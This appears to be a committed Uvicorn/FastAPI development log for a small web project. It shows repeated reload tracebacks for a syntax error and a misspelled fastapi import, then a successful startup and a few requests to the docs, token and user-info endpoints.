+WARNING:  StatReload detected changes in 'routers/users.py'. Reloading...
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 122, in spawn_main
+    exitcode = _main(fd, parent_sentinel)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 131, in _main
+    prepare(preparation_data)
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 246, in prepare
+    _fixup_main_from_path(data['init_main_from_path'])
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 297, in _fixup_main_from_path
+    main_content = runpy.run_path(main_path,
+                   ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "<frozen runpy>", line 291, in run_path
+  File "<frozen runpy>", line 98, in _run_module_code
+  File "<frozen runpy>", line 88, in _run_code
+  File "/home/public/Web/Project1/main.py", line 9, in <module>
+    from routers import news, subpages, users, products
+  File "/home/public/Web/Project1/routers/users.py", line 120
+    async def get_user_info(Depends(auth.get_current_user)):
+                                   ^
+SyntaxError: invalid syntax
+WARNING:  StatReload detected changes in 'routers/users.py'. Reloading...
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 122, in spawn_main
+    exitcode = _main(fd, parent_sentinel)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 131, in _main
+    prepare(preparation_data)
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 246, in prepare
+    _fixup_main_from_path(data['init_main_from_path'])
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 297, in _fixup_main_from_path
+    main_content = runpy.run_path(main_path,
+                   ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "<frozen runpy>", line 291, in run_path
+  File "<frozen runpy>", line 98, in _run_module_code
+  File "<frozen runpy>", line 88, in _run_code
+  File "/home/public/Web/Project1/main.py", line 9, in <module>
+    from routers import news, subpages, users, products
+  File "/home/public/Web/Project1/routers/users.py", line 17, in <module>
+    from utils import auth
+  File "/home/public/Web/Project1/utils/auth.py", line 1, in <module>
+    from fastapi import Header, Depends, HttpException
+ImportError: cannot import name 'HttpException' from 'fastapi' (/usr/lib/python3.11/site-packages/fastapi/__init__.py)
+WARNING:  StatReload detected changes in 'routers/users.py'. Reloading...
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 122, in spawn_main
+    exitcode = _main(fd, parent_sentinel)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 131, in _main
+    prepare(preparation_data)
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 246, in prepare
+    _fixup_main_from_path(data['init_main_from_path'])
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 297, in _fixup_main_from_path
+    main_content = runpy.run_path(main_path,
+                   ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "<frozen runpy>", line 291, in run_path
+  File "<frozen runpy>", line 98, in _run_module_code
+  File "<frozen runpy>", line 88, in _run_code
+  File "/home/public/Web/Project1/main.py", line 9, in <module>
+    from routers import news, subpages, users, products
+  File "/home/public/Web/Project1/routers/users.py", line 17, in <module>
+    from utils import auth
+  File "/home/public/Web/Project1/utils/auth.py", line 1, in <module>
+    from fastapi import Header, Depends, HttpException
+ImportError: cannot import name 'HttpException' from 'fastapi' (/usr/lib/python3.11/site-packages/fastapi/__init__.py)
+WARNING:  StatReload detected changes in 'routers/users.py'. Reloading...
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 122, in spawn_main
+    exitcode = _main(fd, parent_sentinel)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 131, in _main
+    prepare(preparation_data)
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 246, in prepare
+    _fixup_main_from_path(data['init_main_from_path'])
+  File "/usr/lib64/python3.11/multiprocessing/spawn.py", line 297, in _fixup_main_from_path
+    main_content = runpy.run_path(main_path,
+                   ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "<frozen runpy>", line 291, in run_path
+  File "<frozen runpy>", line 98, in _run_module_code
+  File "<frozen runpy>", line 88, in _run_code
+  File "/home/public/Web/Project1/main.py", line 9, in <module>
+    from routers import news, subpages, users, products
+  File "/home/public/Web/Project1/routers/users.py", line 17, in <module>
+    from utils import auth
+  File "/home/public/Web/Project1/utils/auth.py", line 1, in <module>
+    from fastapi import Header, Depends, HttpException
+ImportError: cannot import name 'HttpException' from 'fastapi' (/usr/lib/python3.11/site-packages/fastapi/__init__.py)
+INFO:     Stopping reloader process [99156]
+INFO:     Will watch for changes in these directories: ['/home/public/Web/Project1']
+INFO:     Uvicorn running on http://0.0.0.0:80 (Press CTRL+C to quit)
+INFO:     Started reloader process [110043] using StatReload
+INFO:     Started server process [110049]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     122.226.204.28:2852 - "GET /docs HTTP/1.1" 200 OK
+INFO:     122.226.204.28:2852 - "GET /openapi.json HTTP/1.1" 200 OK
+INFO:     122.226.204.28:2852 - "GET /docs HTTP/1.1" 200 OK
+INFO:     122.226.204.28:2852 - "GET /openapi.json HTTP/1.1" 200 OK
+INFO:     122.226.204.28:2853 - "POST /api/users/tokens HTTP/1.1" 200 OK
+INFO:     122.226.204.28:2854 - "GET /api/users/info HTTP/1.1" 422 Unprocessable Entity
+INFO:     122.226.204.28:2856 - "GET /api/users/info HTTP/1.1" 422 Unprocessable Entity
